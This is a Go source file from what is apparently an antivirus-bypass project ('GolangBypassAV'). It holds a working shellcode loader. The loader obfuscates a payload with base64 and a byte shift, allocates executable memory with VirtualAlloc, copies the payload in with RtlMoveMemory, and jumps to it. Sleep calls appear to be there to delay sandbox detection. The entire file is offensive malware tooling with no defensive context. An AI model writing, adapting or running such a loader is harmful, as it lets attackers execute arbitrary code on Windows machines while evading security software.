package shellcode

import (
	"GolangBypassAV/encry"
	"encoding/base64"
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var kk = []byte{0x12}

func base64Decode(data string) []byte {
	data1, _ := base64.StdEncoding.DecodeString(data)
	return data1
}

func base64Encode(data []byte) string {
	bdata := base64.StdEncoding.EncodeToString(data)
	return bdata
}

func getEnCode(data []byte) string {
	bdata := base64.StdEncoding.EncodeToString(data)

	bydata := []byte(bdata)
	var shellcode []byte

	for i := 0; i < len(bydata); i++ {
		shellcode = append(shellcode, bydata[i]+kk[0])
	}
	return base64.StdEncoding.EncodeToString(shellcode)
}

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func getDeCode(string2 string) []byte {

	ss, _ := base64.StdEncoding.DecodeString(string2)
	string2 = string(ss)
	var shellcode []byte

	bydata := []byte(string2)

	for i := 0; i < len(bydata); i++ {
		shellcode = append(shellcode, bydata[i]-kk[0])
	}
	ssb, _ := base64.StdEncoding.DecodeString(string(shellcode))
	return ssb

}

func checkError(err error) {
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			println(err.Error())
			os.Exit(1)
		}
	}
}

func genEXE(charcode []byte) {

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkError(err)
	}
	gd()

	_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))
	checkError(err)

	gd()
	for j := 0; j < len(charcode); j++ {
		charcode[j] = 0
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func gd() int64 {
	time.Sleep(time.Duration(2) * time.Second)

	dd := time.Now().UTC().UnixNano()
	return dd + 123456

}

func getFileShellCode(file string) []byte {
	data := encry.ReadFile(file)
	//shellCodeHex := encry.GetBase64Data(data)
	//fmt.Print(shellCodeHex)
	return data
}

func getFileShellCode1(file string) string {
	data := encry.ReadFile(file)
	shellCodeHex := base64Encode(data)
	fmt.Print(shellCodeHex)
	return shellCodeHex
}

func Run(string2 []byte) {
	//fmt.Println(1)

	//fmt.Print(getEnCode(getFileShellCode("C:\\Users\\Administrator\\Desktop\\payload.bin")))

	dd := getEnCode(string2)

	shellCodeHex := getDeCode(dd)
	gd()
	genEXE(shellCodeHex)
}
